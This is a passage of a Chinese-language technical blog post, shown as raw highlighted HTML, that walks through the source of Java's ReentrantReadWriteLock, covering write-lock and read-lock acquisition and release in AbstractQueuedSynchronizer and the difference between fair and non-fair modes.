class=\"operator\">=</span> Thread.currentThread();</span><br><span class=\"line\">    <span class=\"comment\">//获取当前状态</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> getState();</span><br><span class=\"line\">    <span class=\"comment\">//统计当前排他锁数量，实际调用c&amp;1111111111111111</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">w</span> <span class=\"operator\">=</span> exclusiveCount(c);</span><br><span class=\"line\">    <span class=\"comment\">//如果有锁</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (c != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// (Note: if c != 0 and w == 0 then shared count != 0)</span></span><br><span class=\"line\">        <span class=\"comment\">//如果排他锁数量为0（此处表示为读锁），如果排他锁数量不为0，但是获取锁的线程不是当前线程，返回获取锁失败</span></span><br><span class=\"line\">        <span class=\"comment\">//判断是否有读锁</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (w == <span class=\"number\">0</span> || current != getExclusiveOwnerThread())</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"comment\">//判断排他锁获取次数是否达到最大值65535</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (w + exclusiveCount(acquires) &gt; MAX_COUNT)</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Error</span>(<span class=\"string\">&quot;Maximum lock count exceeded&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">// Reentrant acquire</span></span><br><span class=\"line\">        <span class=\"comment\">//设置当前状态</span></span><br><span class=\"line\">        setState(c + acquires);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//判断写锁是否需要被阻塞，改方法为抽象方法，</span></span><br><span class=\"line\">    <span class=\"comment\">//由子类FairSync（调用父类AbstractQueuedSynchronizer.hasQueuedPredecessors判断当前线程是否等待节点第二个，</span></span><br><span class=\"line\">    <span class=\"comment\">//同ReentrantLock）、NonfairSync（对于读锁永远为false）实现</span></span><br><span class=\"line\">    <span class=\"comment\">//如果不需要被阻塞，设置锁状态</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (writerShouldBlock() ||</span><br><span class=\"line\">        !compareAndSetState(c, c + acquires))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"comment\">//修改状态成功后，修改当前获取锁的线程为当前线程</span></span><br><span class=\"line\">    setExclusiveOwnerThread(current);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>流程图如下：<br><img src=\"/images/old/20171225%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-12-25%E4%B8%8B%E5%8D%886.34.52.png\"><br>对于写锁而言，相对简单，只要当前存在锁，且不是当前线程获取，都会获取失败。如果存在锁，需要依据是否公平模式来判断是否有资格获取锁。</p>\n<p>WriteLock.tryLock()：直接去获取锁，逻辑和tryAcquire类似，只是少了writerShouldBlock该步骤。<br>WriteLock.tryLock(long timeout, TimeUnit unit)：和ReentrantLock类似，先尝试获取锁，失败后进入等待线程链表，设置阻塞时间，到点唤醒线程获取锁。</p>\n<p>WriteLock.unLock()：释放锁，调用的是父类AbstractQueuedSynchronizer.release代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"type\">boolean</span> <span class=\"title function_\">release</span><span class=\"params\">(<span class=\"type\">int</span> arg)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//尝试释放锁</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (tryRelease(arg)) &#123;</span><br><span class=\"line\">        <span class=\"type\">Node</span> <span class=\"variable\">h</span> <span class=\"operator\">=</span> head;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (h != <span class=\"literal\">null</span> &amp;&amp; h.waitStatus != <span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"comment\">//唤醒下一个节点</span></span><br><span class=\"line\">            unparkSuccessor(h);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//ReentrantReadWriteLock.Sync.tryRelease</span></span><br><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"keyword\">final</span> <span class=\"type\">boolean</span> <span class=\"title function_\">tryRelease</span><span class=\"params\">(<span class=\"type\">int</span> releases)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//判断获取锁的线程是否当前线程</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!isHeldExclusively())</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IllegalMonitorStateException</span>();</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">nextc</span> <span class=\"operator\">=</span> getState() - releases;</span><br><span class=\"line\">    <span class=\"comment\">//用于判断是否完全释放锁</span></span><br><span class=\"line\">    <span class=\"type\">boolean</span> <span class=\"variable\">free</span> <span class=\"operator\">=</span> exclusiveCount(nextc) == <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (free)</span><br><span class=\"line\">        <span class=\"comment\">//如果为0，设置当前修改锁状态为null</span></span><br><span class=\"line\">        setExclusiveOwnerThread(<span class=\"literal\">null</span>);</span><br><span class=\"line\">    <span class=\"comment\">//修改状态</span></span><br><span class=\"line\">    setState(nextc);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> free;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"ReadLock\"><a href=\"#ReadLock\" class=\"headerlink\" title=\"ReadLock\"></a>ReadLock</h3><p>读锁，调用ReadLock.lock后，调用的是父类方法AbstractQueuedSynchronizer.acquireShared()共享锁，代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">void</span> <span class=\"title function_\">acquireShared</span><span class=\"params\">(<span class=\"type\">int</span> arg)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//尝试获取共享锁</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (tryAcquireShared(arg) &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"comment\">//获取共享锁</span></span><br><span class=\"line\">        doAcquireShared(arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//tryAcquireShared实际调用的是子类Sync.tryAcquireShared方法</span></span><br><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"title function_\">tryAcquireShared</span><span class=\"params\">(<span class=\"type\">int</span> unused)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">     * Walkthrough:</span></span><br><span class=\"line\"><span class=\"comment\">     * 1. If write lock held by another thread, fail.</span></span><br><span class=\"line\"><span class=\"comment\">     * 2. Otherwise, this thread is eligible for</span></span><br><span class=\"line\"><span class=\"comment\">     *    lock wrt state, so ask if it should block</span></span><br><span class=\"line\"><span class=\"comment\">     *    because of queue policy. If not, try</span></span><br><span class=\"line\"><span class=\"comment\">     *    to grant by CASing state and updating count.</span></span><br><span class=\"line\"><span class=\"comment\">     *    Note that step does not check for reentrant</span></span><br><span class=\"line\"><span class=\"comment\">     *    acquires, which is postponed to full version</span></span><br><span class=\"line\"><span class=\"comment\">     *    to avoid having to check hold count in</span></span><br><span class=\"line\"><span class=\"comment\">     *    the more typical non-reentrant case.</span></span><br><span class=\"line\"><span class=\"comment\">     * 3. If step 2 fails either because thread</span></span><br><span class=\"line\"><span class=\"comment\">     *    apparently not eligible or CAS fails or count</span></span><br><span class=\"line\"><span class=\"comment\">     *    saturated, chain to version with full retry loop.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"comment\">//获取当前线程</span></span><br><span class=\"line\">    <span class=\"type\">Thread</span> <span class=\"variable\">current</span> <span class=\"operator\">=</span> Thread.currentThread();</span><br><span class=\"line\">    <span class=\"comment\">//获取当前锁状态</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> getState();</span><br><span class=\"line\">    <span class=\"comment\">//判断排它锁数量，如果有排他锁，但并不是当前线程获取锁，返回-1（失败）</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (exclusiveCount(c) != <span class=\"number\">0</span> &amp;&amp;</span><br><span class=\"line\">        getExclusiveOwnerThread() != current)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> -<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"comment\">//获取共享锁获数量，实际提供 状态c&gt;&gt;&gt;16获取</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">r</span> <span class=\"operator\">=</span> sharedCount(c);</span><br><span class=\"line\">    <span class=\"comment\">//判断读是否需要阻塞，通过子类公平锁还是非公平锁处理</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!readerShouldBlock() &amp;&amp;</span><br><span class=\"line\">        <span class=\"comment\">//判断读锁最大获取线程是否超过最大值</span></span><br><span class=\"line\">        r &lt; MAX_COUNT &amp;&amp;</span><br><span class=\"line\">        <span class=\"comment\">//尝试修改当前状态获取锁</span></span><br><span class=\"line\">        compareAndSetState(c, c + SHARED_UNIT)) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//如果当前线程锁获取成功</span></span><br><span class=\"line\">        <span class=\"comment\">//如果当前没有线程获取读锁</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (r == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//设置第一个读取线程为当前线程</span></span><br><span class=\"line\">            firstReader = current;</span><br><span class=\"line\">            <span class=\"comment\">//设置第一个读线程获取次数为1</span></span><br><span class=\"line\">            firstReaderHoldCount = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"comment\">//如果第一个读线程为当前线程</span></span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (firstReader == current) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//第一个读线程获取次数+1</span></span><br><span class=\"line\">            firstReaderHoldCount++;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//用于统计读线程获锁次数，该值存储在线程中ThreadLocal</span></span><br><span class=\"line\">            <span class=\"type\">HoldCounter</span> <span class=\"variable\">rh</span> <span class=\"operator\">=</span> cachedHoldCounter;</span><br><span class=\"line\">            <span class=\"comment\">//如果cachedHoldCounter为空，或者缓存线程id不是当前线程id</span></span><br><span class=\"line\">            <span class=\"comment\">//也就是1 cachedHoldCounter未初始化，进入</span></span><br><span class=\"line\">            <span class=\"comment\">//2 cachedHoldCounter已经初始化，但是当前读锁线程id并不是缓存中的读锁线程id，进入</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (rh == <span class=\"literal\">null</span> || rh.tid != getThreadId(current))</span><br><span class=\"line\">                <span class=\"comment\">//设置缓存统计次数为当前线程中缓存次数，readHolds在Sync构造方法中初始化完成，ThreadLocal子类，用于记录线程读取次数</span></span><br><span class=\"line\">                <span class=\"comment\">//重新获取线程中的数据</span></span><br><span class=\"line\">                cachedHoldCounter = rh = readHolds.get();</span><br><span class=\"line\">            <span class=\"comment\">//如果为当前线程缓存的数据，且统计值为0，</span></span><br><span class=\"line\">            <span class=\"comment\">//因为ThreadLocalHoldCounter重写了ThreadLocal.initialValue方法，调用get方法时，会初始化HoldCounter</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (rh.count == <span class=\"number\">0</span>)</span><br><span class=\"line\">                readHolds.set(rh);</span><br><span class=\"line\">            <span class=\"comment\">//统计+1</span></span><br><span class=\"line\">            rh.count++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//上述条件失败后调用</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> fullTryAcquireShared(current);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//尝试获取锁的完整版，用于CAS获取失败，或者tryAcquireShared获取失败是调用</span></span><br><span class=\"line\"><span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"title function_\">fullTryAcquireShared</span><span class=\"params\">(Thread current)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">     * This code is in part redundant with that in</span></span><br><span class=\"line\"><span class=\"comment\">     * tryAcquireShared but is simpler overall by not</span></span><br><span class=\"line\"><span class=\"comment\">     * complicating tryAcquireShared with interactions between</span></span><br><span class=\"line\"><span class=\"comment\">     * retries and lazily reading hold counts.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"type\">HoldCounter</span> <span class=\"variable\">rh</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"comment\">//cas</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//获取锁当前状态</span></span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> getState();</span><br><span class=\"line\">        <span class=\"comment\">//比较排他锁</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (exclusiveCount(c) != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//如果存在排它锁，且不是当前线程获取，返回-1获取失败</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (getExclusiveOwnerThread() != current)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> -<span class=\"number\">1</span>;</span><br><span class=\"line\">            <span class=\"comment\">// else we hold the exclusive lock; blocking here</span></span><br><span class=\"line\">            <span class=\"comment\">// would cause deadlock.</span></span><br><span class=\"line\">        <span class=\"comment\">//判断读锁是否需要阻塞，依据是否公平锁处理，如果需要阻塞，执行下面步骤</span></span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (readerShouldBlock()) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Make sure we&#x27;re not acquiring read lock reentrantly</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (firstReader == current) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// assert firstReaderHoldCount &gt; 0;</span></span><br><span class=\"line\">            <span class=\"comment\">//如果第一个读线程，不是当前线程</span></span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (rh == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                    rh = cachedHoldCounter;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (rh == <span class=\"literal\">null</span> || rh.tid != getThreadId(current)) &#123;</span><br><span class=\"line\">                        rh = readHolds.get();</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (rh.count == <span class=\"number\">0</span>)</span><br><span class=\"line\">                            readHolds.remove();</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (rh.count == <span class=\"number\">0</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> -<span class=\"number\">1</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//判断是否超过最大读线程数量</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (sharedCount(c) == MAX_COUNT)</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Error</span>(<span class=\"string\">&quot;Maximum lock count exceeded&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//尝试修改state获取锁</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (compareAndSetState(c, c + SHARED_UNIT)) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//获取锁成功</span></span><br><span class=\"line\">            <span class=\"comment\">//判断之前锁是否未被获取</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (sharedCount(c) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//未被获取，设置第一个读取线程为当前线程</span></span><br><span class=\"line\">                firstReader = current;</span><br><span class=\"line\">                <span class=\"comment\">//设置第一个读线程获取次数为1</span></span><br><span class=\"line\">                firstReaderHoldCount = <span class=\"number\">1</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (firstReader == current) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//如果当前线程为第一个获取读锁的线程，获取次数+1</span></span><br><span class=\"line\">                firstReaderHoldCount++;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"comment\">//设置当前线程重入锁次数</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (rh == <span class=\"literal\">null</span>)</span><br><span class=\"line\">                    rh = cachedHoldCounter;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (rh == <span class=\"literal\">null</span> || rh.tid != getThreadId(current))</span><br><span class=\"line\">                    rh = readHolds.get();</span><br><span class=\"line\">                <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (rh.count == <span class=\"number\">0</span>)</span><br><span class=\"line\">                    readHolds.set(rh);</span><br><span class=\"line\">                rh.count++;</span><br><span class=\"line\">                cachedHoldCounter = rh; <span class=\"comment\">// cache for release</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//在tryAcquireShared中如果获取锁失败，进入doAcquireShared</span></span><br><span class=\"line\"><span class=\"comment\">//AbstractQueuedSynchronizer.doAcquireShared</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">doAcquireShared</span><span class=\"params\">(<span class=\"type\">int</span> arg)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//生产共享锁线程节点</span></span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">Node</span> <span class=\"variable\">node</span> <span class=\"operator\">=</span> addWaiter(Node.SHARED);</span><br><span class=\"line\">    <span class=\"type\">boolean</span> <span class=\"variable\">failed</span> <span class=\"operator\">=</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">boolean</span> <span class=\"variable\">interrupted</span> <span class=\"operator\">=</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"comment\">//CAS</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//获取当前线程上一个节点</span></span><br><span class=\"line\">            <span class=\"keyword\">final</span> <span class=\"type\">Node</span> <span class=\"variable\">p</span> <span class=\"operator\">=</span> node.predecessor();</span><br><span class=\"line\">            <span class=\"comment\">//判断上一个节点是否头节点</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (p == head) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//尝试获取共享锁</span></span><br><span class=\"line\">                <span class=\"type\">int</span> <span class=\"variable\">r</span> <span class=\"operator\">=</span> tryAcquireShared(arg);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (r &gt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//获取成功</span></span><br><span class=\"line\">                    <span class=\"comment\">//设置头节点为当前线程传播</span></span><br><span class=\"line\">                    setHeadAndPropagate(node, r);</span><br><span class=\"line\">                    p.next = <span class=\"literal\">null</span>; <span class=\"comment\">// help GC</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (interrupted)</span><br><span class=\"line\">                        selfInterrupt();</span><br><span class=\"line\">                    failed = <span class=\"literal\">false</span>;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">//同ReentrantLock</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (shouldParkAfterFailedAcquire(p, node) &amp;&amp;</span><br><span class=\"line\">                parkAndCheckInterrupt())</span><br><span class=\"line\">                interrupted = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (failed)</span><br><span class=\"line\">            cancelAcquire(node);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//读线程获取锁后调用</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setHeadAndPropagate</span><span class=\"params\">(Node node, <span class=\"type\">int</span> propagate)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//置换头节点为下一个节点</span></span><br><span class=\"line\">    <span class=\"type\">Node</span> <span class=\"variable\">h</span> <span class=\"operator\">=</span> head; <span class=\"comment\">// Record old head for check below</span></span><br><span class=\"line\">    setHead(node);</span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">     * Try to signal next queued node if:</span></span><br><span class=\"line\"><span class=\"comment\">     *   Propagation was indicated by caller,</span></span><br><span class=\"line\"><span class=\"comment\">     *     or was recorded (as h.waitStatus either before</span></span><br><span class=\"line\"><span class=\"comment\">     *     or after setHead) by a previous operation</span></span><br><span class=\"line\"><span class=\"comment\">     *     (note: this uses sign-check of waitStatus because</span></span><br><span class=\"line\"><span class=\"comment\">     *      PROPAGATE status may transition to SIGNAL.)</span></span><br><span class=\"line\"><span class=\"comment\">     * and</span></span><br><span class=\"line\"><span class=\"comment\">     *   The next node is waiting in shared mode,</span></span><br><span class=\"line\"><span class=\"comment\">     *     or we don&#x27;t know, because it appears null</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * The conservatism in both of these checks may cause</span></span><br><span class=\"line\"><span class=\"comment\">     * unnecessary wake-ups, but only when there are multiple</span></span><br><span class=\"line\"><span class=\"comment\">     * racing acquires/releases, so most need signals now or soon</span></span><br><span class=\"line\"><span class=\"comment\">     * anyway.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (propagate &gt; <span class=\"number\">0</span> || h == <span class=\"literal\">null</span> || h.waitStatus &lt; <span class=\"number\">0</span> ||</span><br><span class=\"line\">        (h = head) == <span class=\"literal\">null</span> || h.waitStatus &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"type\">Node</span> <span class=\"variable\">s</span> <span class=\"operator\">=</span> node.next;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (s == <span class=\"literal\">null</span> || s.isShared())</span><br><span class=\"line\">            <span class=\"comment\">//下一个节点为共享锁</span></span><br><span class=\"line\">            doReleaseShared();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//释放共享锁</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">doReleaseShared</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">     * Ensure that a release propagates, even if there are other</span></span><br><span class=\"line\"><span class=\"comment\">     * in-progress acquires/releases.  This proceeds in the usual</span></span><br><span class=\"line\"><span class=\"comment\">     * way of trying to unparkSuccessor of head if it needs</span></span><br><span class=\"line\"><span class=\"comment\">     * signal. But if it does not, status is set to PROPAGATE to</span></span><br><span class=\"line\"><span class=\"comment\">     * ensure that upon release, propagation continues.</span></span><br><span class=\"line\"><span class=\"comment\">     * Additionally, we must loop in case a new node is added</span></span><br><span class=\"line\"><span class=\"comment\">     * while we are doing this. Also, unlike other uses of</span></span><br><span class=\"line\"><span class=\"comment\">     * unparkSuccessor, we need to know if CAS to reset status</span></span><br><span class=\"line\"><span class=\"comment\">     * fails, if so rechecking.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">        <span class=\"type\">Node</span> <span class=\"variable\">h</span> <span class=\"operator\">=</span> head;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (h != <span class=\"literal\">null</span> &amp;&amp; h != tail) &#123;</span><br><span class=\"line\">            <span class=\"type\">int</span> <span class=\"variable\">ws</span> <span class=\"operator\">=</span> h.waitStatus;</span><br><span class=\"line\">            <span class=\"comment\">//如果当前状态为SIGNAL状态，目的是为了唤醒当前后续的共享线程节点</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (ws == Node.SIGNAL) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//设置当前节点状态为0，失败重试</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (!compareAndSetWaitStatus(h, Node.SIGNAL, <span class=\"number\">0</span>))</span><br><span class=\"line\">                    <span class=\"keyword\">continue</span>;            <span class=\"comment\">// loop to recheck cases</span></span><br><span class=\"line\">                <span class=\"comment\">//如果设置节点状态成功，唤醒下一个节点</span></span><br><span class=\"line\">                unparkSuccessor(h);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">//如果当前状态为0，设置为PROPAGATE</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (ws == <span class=\"number\">0</span> &amp;&amp;</span><br><span class=\"line\">                     !compareAndSetWaitStatus(h, <span class=\"number\">0</span>, Node.PROPAGATE))</span><br><span class=\"line\">                <span class=\"keyword\">continue</span>;                <span class=\"comment\">// loop on failed CAS</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//判断头节点是否被修改，如果被修改了，继续唤醒下一个节点</span></span><br><span class=\"line\">        <span class=\"comment\">//这里会出现唤醒的线程一直修改了头，就可能出现多个线程进入doReleaseShared方法，尝试修改下一个节点，这样唤醒节点更快吗？</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (h == head)                   <span class=\"comment\">// loop if head changed</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>尝试获取锁流程图如下：<br><img src=\"/images/old/20171225%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-12-25%E4%B8%8B%E5%8D%885.28.41.png\"><br>获取锁失败后doAcquireShared如图：<br><img src=\"/images/old/20171225%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-12-25%E4%B8%8B%E5%8D%886.30.33.png\"></p>\n<p>ReadLock.tryLock，调用的实际上是Sync.tryReadLock。比较简单，判断如果存在写锁切不是当前线程获取直接返回false，如果不存在写锁，直接修改锁状态，更新重入次数。<br>ReadLock.tryLock(long timeout, TimeUnit unit)，和之前类似，先尝试获取锁（受公平模式影响），如果失败放入链表阻塞，设置阻塞时间，等待唤醒。<br>ReadLock.unLock()，调用的父类AbstractQueuedSynchronizer.releaseShared，先tryReleaseShared尝试释放锁，后调用doReleaseShared()如上。tryReleaseShared调用比较简单，修改重入次数，修改锁状态。</p>\n<h3 id=\"公平锁、非公平锁\"><a href=\"#公平锁、非公平锁\" class=\"headerlink\" title=\"公平锁、非公平锁\"></a>公平锁、非公平锁</h3><p>默认情况下创建时非公平锁。<br>公平锁：<br>读、写：都需要判断当前节点是否第二个节点、或者列表为null、或者就一个节点</p>\n<p>非公平锁：<br>写：不需要阻塞<br>读：头节点不为空、下一个节点不为空、下一个不是共享节点、下一个节点线程不为空都成立下阻塞。其实就是如果下一个节点为非共享锁就需要阻塞。目的是为了不让写锁一直等待（此处下一个节点表示head下一个节点，即当前线程所在节点）。</p>\n<ul>\n<li>注：非公平锁读是否阻塞时，在使用ReadLock.lock()会创建节点，节点的nextWaiter百分百是SHARE，那么在判断节点是否SHARE时肯定会返回True，WriteLock创建节点时，使用的是EXCLUSIVE，但是写锁由不会调用改方法，此处的作用是什么。很疑惑。可能是与其他方法结合使用吧。</li>\n</ul>\n<h3 id=\"读写锁交替使用\"><a href=\"#读写锁交替使用\" class=\"headerlink\" title=\"读写锁交替使用\"></a>读写锁交替使用</h3><p>先使用读锁、后使用写锁，如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ReentrantReadWriteLock</span> <span class=\"variable\">readWriteLock</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ReentrantReadWriteLock</span>();</span><br><span class=\"line\"><span 